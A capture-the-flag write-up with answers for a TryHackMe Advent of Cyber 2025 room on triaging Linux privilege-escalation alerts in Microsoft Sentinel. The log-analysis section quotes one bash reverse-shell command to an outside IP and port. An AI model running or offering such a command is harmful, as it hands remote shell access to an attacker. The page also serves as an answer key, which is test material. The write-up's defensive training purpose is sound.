**Room Link:**  
https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2

## ▶️ MyDFIR – Day 10 Video Walkthrough  
Official walkthrough for quick onboarding:

🔗 **YouTube Link:**  
https://youtu.be/0VRfOfFRHuU?si=qi2rup7OiDiKCae_

---

# 🎄 Advent of Cyber 2025 — Day 10 Write-Up  
## 🧩 SOC Alert Triaging — Tinsel Triage

---

# ✅ Challenge Answers

---

### **1️⃣ How many entities are affected by the “Linux PrivEsc – Polkit Exploit Attempt” alert?**

<img width="1920" height="1080" alt="polkit alert" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/1first.png?raw=true" />

<img width="1920" height="1031" alt="entities count" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/1ans1.png?raw=true" />

```
10
```

---

### **2️⃣ What is the severity of the “Linux PrivEsc – Sudo Shadow Access” alert?**

<img width="1920" height="1039" alt="sudo shadow severity" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/2ans2.png?raw=true" />

```
High
```

---

### **3️⃣ How many accounts were added to the sudoers group in the “Linux PrivEsc – User Added to Sudo Group” alert?**

<img width="1920" height="1038" alt="sudo group alert" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/3final.png?raw=true" />

<img width="1172" height="458" alt="sudo group count" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/4ans3.png?raw=true" />

```
4
```

---

# 🔎 In-Depth Log Analysis with Sentinel

---

### **1️⃣ What is the name of the kernel module installed in `websrv-01`?**

<img width="1920" height="1041" alt="kernel module kql" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/5prog.png?raw=true" />

<img width="1917" height="1037" alt="kernel module result" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/6ans1.png?raw=true" />

```
malicious_mod.ko
```

---

### **2️⃣ What is the unusual command executed within `websrv-01` by the ops user?**

<img width="1920" height="1042" alt="reverse shell command" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/7ans2.png?raw=true" />

```
/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
```

---

### **3️⃣ What is the source IP address of the first successful SSH login to `storage-01`?**

<img width="1920" height="1043" alt="ssh login source ip" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/8ans3.png?raw=true" />

```
172.16.0.12
```

---

### **4️⃣ What is the external source IP that successfully logged in as root to `app-01`?**

<img width="1920" height="1039" alt="external ssh root ip" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/9ans4.png?raw=true" />

```
203.0.113.45
```

---

### **5️⃣ Aside from the backup user, which user was added to the sudoers group in `app-01`?**

<img width="1919" height="1036" alt="sudoers new user" src="https://github.com/csc-itnu/advent-of-cyber-2025/blob/main/images/day10/10ans5.png?raw=true" />

```
deploy
```

---

